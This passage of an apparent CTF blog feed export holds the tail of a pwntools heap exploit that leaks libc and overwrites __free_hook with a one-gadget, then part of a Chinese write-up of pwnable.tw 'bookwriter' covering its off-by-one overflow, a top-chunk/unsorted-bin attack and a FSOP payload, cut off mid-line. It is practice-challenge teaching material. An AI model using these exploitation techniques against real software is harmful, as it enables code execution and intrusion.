class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">changeid</span>(<span class=\"params\">i</span>):</span><br><span class=\"line\">        ch(<span class=\"number\">6</span>)</span><br><span class=\"line\">        r.sendlineafter(<span class=\"string\">&quot;id&quot;</span>,<span class=\"built_in\">str</span>(i))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#leak heap_addr</span></span><br><span class=\"line\"></span><br><span class=\"line\">r.sendline(<span class=\"string\">&quot;0&quot;</span>)</span><br><span class=\"line\">addstudent(<span class=\"number\">1</span>)</span><br><span class=\"line\">givescore()</span><br><span class=\"line\">writereview(<span class=\"number\">0</span>,<span class=\"number\">0x310</span>,<span class=\"string\">&quot;aaaaaaa&quot;</span>)</span><br><span class=\"line\">changerole(<span class=\"number\">1</span>)</span><br><span class=\"line\">pray()</span><br><span class=\"line\">changerole(<span class=\"number\">0</span>)</span><br><span class=\"line\">addstudent(<span class=\"number\">1</span>)</span><br><span class=\"line\">pad = <span class=\"string\">b&#x27;A&#x27;</span>*<span class=\"number\">0xa0</span>+p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">0x271</span>)+<span class=\"string\">b&#x27;AAAAAAAA&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">writereview(<span class=\"number\">1</span>,<span class=\"number\">0x310</span>,<span class=\"string\">&quot;aaaaaaaa&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">addstudent(<span class=\"number\">1</span>)</span><br><span class=\"line\">writereview(<span class=\"number\">2</span>,<span class=\"number\">0x310</span>,pad)</span><br><span class=\"line\">addstudent(<span class=\"number\">1</span>)</span><br><span class=\"line\">writereview(<span class=\"number\">3</span>,<span class=\"number\">0x20</span>,<span class=\"string\">&quot;bbbbbbbb&quot;</span>)</span><br><span class=\"line\">changerole(<span class=\"number\">1</span>)</span><br><span class=\"line\">changeid(<span class=\"number\">1</span>)</span><br><span class=\"line\">pray()</span><br><span class=\"line\">changeid(<span class=\"number\">2</span>)</span><br><span class=\"line\">pray()</span><br><span class=\"line\">changeid(<span class=\"number\">3</span>)</span><br><span class=\"line\">pray()</span><br><span class=\"line\">changerole(<span class=\"number\">0</span>)</span><br><span class=\"line\">givescore()</span><br><span class=\"line\">changerole(<span class=\"number\">1</span>)</span><br><span class=\"line\">ch(<span class=\"number\">2</span>)</span><br><span class=\"line\">r.recvuntil(<span class=\"string\">&quot;Good Job! Here is your reward! &quot;</span>)</span><br><span class=\"line\">heap_addr = <span class=\"built_in\">int</span>(r.recvuntil(<span class=\"string\">&#x27;\\n&#x27;</span>,drop=<span class=\"literal\">True</span>),<span class=\"number\">16</span>)-<span class=\"number\">0x10</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;heap_addr : &quot;</span>,<span class=\"built_in\">hex</span>(heap_addr))</span><br><span class=\"line\">aimed = (heap_addr+<span class=\"number\">0x3c9</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;aimed : &quot;</span>,<span class=\"built_in\">hex</span>(aimed))</span><br><span class=\"line\">r.sendafter(<span class=\"string\">&quot;addr&quot;</span>,<span class=\"string\">&quot;00&quot;</span>+<span class=\"built_in\">str</span>(aimed))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#new student ,free to tcaceh </span></span><br><span class=\"line\">r.sendline(<span class=\"string\">&#x27;3&#x27;</span>)</span><br><span class=\"line\">changerole(<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">callparent(<span class=\"number\">1</span>)</span><br><span class=\"line\">addstudent(<span class=\"number\">1</span>)</span><br><span class=\"line\">writereview(<span class=\"number\">3</span>,<span class=\"number\">0x18</span>,<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x18</span>)</span><br><span class=\"line\">changerole(<span class=\"number\">1</span>)</span><br><span class=\"line\">changeid(<span class=\"number\">2</span>)</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(r)</span></span><br><span class=\"line\">ch(<span class=\"number\">2</span>)</span><br><span class=\"line\">aimed = heap_addr+<span class=\"number\">0x411</span></span><br><span class=\"line\">r.sendafter(<span class=\"string\">&quot;addr&quot;</span>,<span class=\"string\">&quot;00&quot;</span>+<span class=\"built_in\">str</span>(aimed))</span><br><span class=\"line\">changeid(<span class=\"number\">3</span>)</span><br><span class=\"line\">ch(<span class=\"number\">2</span>)</span><br><span class=\"line\">r.recvuntil(<span class=\"string\">b&#x27;\\x00&#x27;</span>*<span class=\"number\">6</span>)</span><br><span class=\"line\">libcbase = u64(r.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))-<span class=\"number\">0x1ecbe0</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;libc : &quot;</span>,<span class=\"built_in\">hex</span>(libcbase))</span><br><span class=\"line\">environ =libcbase- <span class=\"number\">0x1ef600</span></span><br><span class=\"line\">malloc_hook = libcbase + <span class=\"number\">0x1ecb70</span></span><br><span class=\"line\">free_hook = libcbase +  <span class=\"number\">0x1eee48</span></span><br><span class=\"line\">onegadget = libcbase + <span class=\"number\">0xe3b31</span></span><br><span class=\"line\"><span class=\"comment\">#onegadget = 0xcafebabedeadbeef</span></span><br><span class=\"line\">changerole(<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#we have already leak the libc address,</span></span><br><span class=\"line\"><span class=\"comment\">#but next how can we realize write anywhere</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">addstudent(<span class=\"number\">1</span>)</span><br><span class=\"line\">writereview(<span class=\"number\">4</span>,<span class=\"number\">0x10</span>,<span class=\"string\">&quot;CCCC&quot;</span>)</span><br><span class=\"line\">pad =  <span class=\"string\">b&#x27;x&#x27;</span>*<span class=\"number\">0x18</span>+p64(<span class=\"number\">0x31</span>)</span><br><span class=\"line\">pad += p64(heap_addr+<span class=\"number\">0x470</span>)+p64(<span class=\"number\">0</span>)*<span class=\"number\">4</span></span><br><span class=\"line\">pad += p64(<span class=\"number\">0x21</span>)+p64(<span class=\"number\">1</span>)+p64(free_hook)</span><br><span class=\"line\">writereview(<span class=\"number\">3</span>,<span class=\"number\">0</span>,pad)</span><br><span class=\"line\">writereview(<span class=\"number\">4</span>,<span class=\"number\">0</span>,p64(onegadget))</span><br><span class=\"line\">callparent(<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">r.interactive()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n",
            "tags": [
                "writeup"
            ]
        },
        {
            "id": "http://example.com/2022/04/14/heap-paradise/",
            "url": "http://example.com/2022/04/14/heap-paradise/",
            "title": "heap_paradise",
            "date_published": "2022-04-14T05:08:37.000Z",
            "content_html": "",
            "tags": [
                "writeup"
            ]
        },
        {
            "id": "http://example.com/2022/04/10/pwnable-bookwriter/",
            "url": "http://example.com/2022/04/10/pwnable-bookwriter/",
            "title": "",
            "date_published": "2022-04-10T11:09:05.000Z",
            "content_html": "<h1 id=\"pwnabletw\"><a class=\"markdownIt-Anchor\" href=\"#pwnabletw\">#</a> <span class=\"exturl\" data-url=\"aHR0cDovL3B3bmFibGUudHc=\">pwnable.tw</span>\tbookwriter\t\t\tubuntu16,libc 2.23</h1>\n<h2 id=\"保护\"><a class=\"markdownIt-Anchor\" href=\"#保护\">#</a> 保护：</h2>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">giantbranch@ubuntu:~/Desktop/pwnabletw/BookWriter$ checksec --file=bookwriter</span><br><span class=\"line\">[*] <span class=\"string\">&#x27;/home/giantbranch/Desktop/pwnabletw/BookWriter/bookwriter&#x27;</span></span><br><span class=\"line\">    Arch:     amd64-<span class=\"number\">64</span>-little</span><br><span class=\"line\">    RELRO:    Full RELRO</span><br><span class=\"line\">    Stack:    Canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (<span class=\"number\">0x400000</span>)</span><br><span class=\"line\">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure>\n<h2 id=\"主要代码\"><a class=\"markdownIt-Anchor\" href=\"#主要代码\">#</a> 主要代码：</h2>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">giantbranch@ubuntu:~/Desktop/pwnabletw/BookWriter$ ./bookwriter </span><br><span class=\"line\">Welcome to the BookWriter !</span><br><span class=\"line\">Author :qqqqqqqqqqq</span><br><span class=\"line\">----------------------</span><br><span class=\"line\">      BookWriter      </span><br><span class=\"line\">----------------------</span><br><span class=\"line\"> <span class=\"number\">1.</span> Add a page        </span><br><span class=\"line\"> <span class=\"number\">2.</span> View a page       </span><br><span class=\"line\"> <span class=\"number\">3.</span> Edit a page       </span><br><span class=\"line\"> <span class=\"number\">4.</span> Information       </span><br><span class=\"line\"> <span class=\"number\">5.</span> Exit              </span><br><span class=\"line\">----------------------</span><br><span class=\"line\">Your choice :^C</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"main函数\"><a class=\"markdownIt-Anchor\" href=\"#main函数\">#</a> main 函数</h3>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> __fastcall <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> a1, <span class=\"type\">char</span> **a2, <span class=\"type\">char</span> **a3)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  setvbuf(<span class=\"built_in\">stdout</span>, <span class=\"number\">0LL</span>, <span class=\"number\">2</span>, <span class=\"number\">0LL</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Welcome to the BookWriter !&quot;</span>);</span><br><span class=\"line\">  readname();</span><br><span class=\"line\">  <span class=\"keyword\">while</span> ( <span class=\"number\">1</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    menu();</span><br><span class=\"line\">    <span class=\"keyword\">switch</span> ( getnum() )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">case</span> <span class=\"number\">1LL</span>:</span><br><span class=\"line\">        add();</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      <span class=\"keyword\">case</span> <span class=\"number\">2LL</span>:</span><br><span class=\"line\">        info();</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      <span class=\"keyword\">case</span> <span class=\"number\">3LL</span>:</span><br><span class=\"line\">        edit();</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      <span class=\"keyword\">case</span> <span class=\"number\">4LL</span>:</span><br><span class=\"line\">        updatename();</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      <span class=\"keyword\">case</span> <span class=\"number\">5LL</span>:</span><br><span class=\"line\">        <span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">      <span class=\"keyword\">default</span>:</span><br><span class=\"line\">        <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Invalid choice&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"readname函数\"><a class=\"markdownIt-Anchor\" href=\"#readname函数\">#</a> readname 函数</h3>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 <span class=\"title function_\">sub_400BDF</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Author :&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> readck(&amp;auther, <span class=\"number\">64LL</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">__int64 __fastcall <span class=\"title function_\">readck</span><span class=\"params\">(__int64 a1, <span class=\"type\">unsigned</span> <span class=\"type\">int</span> a2)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> len; <span class=\"comment\">// [rsp+1Ch] [rbp-4h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  len = _read_chk(<span class=\"number\">0LL</span>, a1, a2, a2);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( len &lt; <span class=\"number\">0</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;read error&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">exit</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( *(_BYTE *)(len - <span class=\"number\">1LL</span> + a1) == <span class=\"string\">&#x27;\\n&#x27;</span> )</span><br><span class=\"line\">    *(_BYTE *)(len - <span class=\"number\">1LL</span> + a1) = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)len;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"menu函数\"><a class=\"markdownIt-Anchor\" href=\"#menu函数\">#</a> menu 函数</h3>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">menu</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;----------------------&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;      BookWriter      &quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;----------------------&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot; 1. Add a page        &quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot; 2. View a page       &quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot; 3. Edit a page       &quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot; 4. Information       &quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot; 5. Exit              &quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;----------------------&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Your choice :&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"add函数\"><a class=\"markdownIt-Anchor\" href=\"#add函数\">#</a> add 函数</h3>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">add</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">int</span> i; <span class=\"comment\">// [rsp+Ch] [rbp-14h]</span></span><br><span class=\"line\">  <span class=\"type\">char</span> *v2; <span class=\"comment\">// [rsp+10h] [rbp-10h]</span></span><br><span class=\"line\">  __int64 size; <span class=\"comment\">// [rsp+18h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; ; ++i )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( i &gt; <span class=\"number\">8</span> )</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;You can&#x27;t add new page anymore!&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( !(&amp;ptrlist)[i] )</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Size of page :&quot;</span>);</span><br><span class=\"line\">  size = getnum();</span><br><span class=\"line\">  v2 = (<span class=\"type\">char</span> *)<span class=\"built_in\">malloc</span>(size);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !v2 )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Error !&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Content :&quot;</span>);</span><br><span class=\"line\">  readck((__int64)v2, size);</span><br><span class=\"line\">  (&amp;ptrlist)[i] = v2;</span><br><span class=\"line\">  sizelist[i] = size;</span><br><span class=\"line\">  ++count;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Done !&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"info函数\"><a class=\"markdownIt-Anchor\" href=\"#info函数\">#</a> info 函数</h3>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">info</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">int</span> idx; <span class=\"comment\">// [rsp+Ch] [rbp-4h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Index of page :&quot;</span>);</span><br><span class=\"line\">  idx = getnum();</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( idx &gt; <span class=\"number\">7</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;out of page:&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !(&amp;ptrlist)[idx] )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Not found !&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Page #%u \\n&quot;</span>, idx);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Content :\\n%s\\n&quot;</span>, (&amp;ptrlist)[idx]);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"edit函数\"><a class=\"markdownIt-Anchor\" href=\"#edit函数\">#</a> edit 函数</h3>\n<figure class=\"highlight v\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">int</span> edit()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> v1; <span class=\"comment\">// [rsp+Ch] [rbp-4h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  printf(<span class=\"string\">&quot;Index of page :&quot;</span>);</span><br><span class=\"line\">  v1 = getnum();</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v1 &gt; <span class=\"number\">7</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    puts(<span class=\"string\">&quot;out of page:&quot;</span>);</span><br><span class=\"line\">    exit(<span class=\"number\">0</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !(&amp;ptrlist)[v1] )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> puts(<span class=\"string\">&quot;Not found !&quot;</span>);</span><br><span class=\"line\">  printf(<span class=\"string\">&quot;Content:&quot;</span>);</span><br><span class=\"line\">  readck((__int64)(&amp;ptrlist)[v1], sizelist[v1]);</span><br><span class=\"line\">  sizelist[v1] = strlen((&amp;ptrlist)[v1]);        <span class=\"comment\">// 更新size，但是，readck不会加设空结尾，不对齐输入，可以造成溢出1字节</span></span><br><span class=\"line\">  <span class=\"keyword\">return</span> puts(<span class=\"string\">&quot;Done !&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这里虽然会更新 size，但是如果我们读入的 text，刚好填充 chunk 的用户区，但是结尾不是’\\x00’，更新长度的时候，会把下一个堆块的 size 算进去。造成溢出，如果是 topchunk_size 溢出会更多</p>\n<h3 id=\"updatename函数\"><a class=\"markdownIt-Anchor\" href=\"#updatename函数\">#</a> updatename 函数</h3>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">unsigned</span> __int64 <span class=\"title function_\">updatename</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> v1; <span class=\"comment\">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v2; <span class=\"comment\">// [rsp+8h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v2 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  v1 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Author : %s\\n&quot;</span>, auther);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Page : %u\\n&quot;</span>, (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)count);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Do you want to change the author ? (yes:1 / no:0) &quot;</span>);</span><br><span class=\"line\">  _isoc99_scanf(<span class=\"string\">&quot;%d&quot;</span>, &amp;v1);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v1 == <span class=\"number\">1</span> )</span><br><span class=\"line\">    readnum();</span><br><span class=\"line\">  <span class=\"keyword\">return</span> __readfsqword(<span class=\"number\">0x28</span>u) ^ v2;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"思路\"><a class=\"markdownIt-Anchor\" href=\"#思路\">#</a> 思路</h2>\n<p>程序的一的大漏洞就是对于输入的字符串只会检查换行符，而不会见擦汗输入是否有结束符，输入 name 的时候，党字符串长度为 64 时，就会接上 gptr, 导致堆地址泄露。</p>\n<p>程序没有 free，如何泄露 libc？</p>\n<p>add 时，判断错误，会导致读入第九个在 sizelist 的位置，所以修改 sizelist [0] 的大小为 0，readck 允许读入为 0。导致再次 edit ptrlist [0] 时读入很大数据溢出。修改 topchunk：</p>\n<p>edit 时，对于非对齐输入，会造成溢出，将下一个堆块的 size，计入当前堆块 content 的 size，topchunk 溢出 3 字节，其他堆块溢出 1 字节。通过三字节的溢出将 topchunk 变得很小。</p>\n<p><em>updatename 的时候使用了 scnaf (&quot;% d&quot;)，这有点奇怪，因为 scanf 需要用到堆空间来处理缓存：（这里没有任何利用价值）：</em></p>\n<p>关键还是在于修改 topchunk , 党 topchunk_size 小于申请的空间大小时，会释放 topchunk 进入 unsortedbins, 这样就会造成 libc 及地址的泄露。</p>\n<p>当我们已经申请了 8 个 page，如果 size [0]==0，就可以绕过检查，额外申请出来一个 page，将地址返回写道 size [0]，那么，再次 edit ptrlist [0] 时，就可以实现溢出，（因为地址很大，足够溢出）</p>\n<p>同时，更新 comment 的长度依旧是检查空字符，所以可以使的更新后对应的 size 为 0，导致第九个指针变量为 0，可以继续申请堆块，这个可以重复利用。</p>\n<p>如此，旧的 topchunk 在 unsortedbins 里面，修改其 bk 指针，利用 unsortedbins attack 实现任意地址写大数据（main_arena+88），</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; p _IO_list_all</span><br><span class=\"line\">$<span class=\"number\">1</span> = (<span class=\"keyword\">struct</span> _IO_FILE_plus *) <span class=\"number\">0x7f7ba0e31540</span> &lt;_IO_2_1_stderr_&gt;</span><br><span class=\"line\"><span class=\"comment\">//payload = b&#x27;/bin/sh\\x00&#x27;+p64(0x61)+p64(main_arena)+p64(list_all-0x10)+p64(2)+p64(3)</span></span><br><span class=\"line\">pwndbg&gt; p _IO_list_all</span><br><span class=\"line\">$<span class=\"number\">2</span> = (<span class=\"keyword\">struct</span> _IO_FILE_plus *) <span 